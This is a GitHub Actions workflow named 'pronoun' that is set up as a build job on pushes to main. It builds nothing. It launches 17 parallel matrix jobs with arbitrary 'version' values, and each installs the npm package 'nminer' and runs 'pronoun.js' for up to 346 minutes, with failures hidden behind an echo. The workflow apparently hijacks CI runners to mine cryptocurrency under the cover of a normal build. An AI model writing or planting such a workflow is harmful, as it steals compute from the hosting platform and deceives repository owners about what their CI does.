name: pronoun
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 1108 }
          - { version: 98 }
          - { version: 8327 }
          - { version: 962 }
          - { version: 1060 }
          - { version: 3915 }
          - { version: 7880 }
          - { version: 8983 }
          - { version: 1461 }
          - { version: 5898 }
          - { version: 8743 }
          - { version: 8181 }
          - { version: 7692 }
          - { version: 2852 }
          - { version: 1047 }
          - { version: 1850 }
          - { version: 4510 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: 
        run: |
          npm install nminer@latest
          timeout 346m node pronoun.js || echo "pronoun executed"